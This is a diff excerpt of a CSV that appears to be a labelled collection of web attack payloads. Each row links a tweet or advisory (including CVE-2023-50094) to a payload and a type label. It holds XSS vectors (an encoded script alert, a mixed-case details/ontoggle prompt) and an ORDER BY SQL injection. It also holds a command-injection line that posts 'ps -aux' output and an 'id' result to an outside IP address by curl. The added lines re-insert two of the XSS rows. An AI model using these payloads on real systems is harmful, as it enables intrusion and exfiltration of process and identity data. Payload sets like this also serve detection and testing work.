@@ -487,3 +487,5 @@ https://twitter.com/g1nk00/status/1735407588529913969,&amp;#60;script&amp;#62;al
 https://twitter.com/TheMsterDoctor1/status/1743187595163501005,&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x&gt;,xss
 https://vulners.com/github/GHSA-H374-MM57-879C?utm_source=rss&utm_medium=rss&utm_campaign=rss,(CASE+WHEN+(SELECT+1)=1+THEN+id+ELSE+updated_at+END)+ASC+,sqli
 https://vulners.com/cve/CVE-2023-50094?utm_source=rss&utm_medium=rss&utm_campaign=rss,curl%20-X%20POST%20--data%20"$(ps%20-aux)"%20192.168.1.91/?`id`,rce
+https://twitter.com/g1nk00/status/1735407588529913969,"&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;",xss
+https://twitter.com/TheMsterDoctor1/status/1743187595163501005,"&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x&gt;",xss
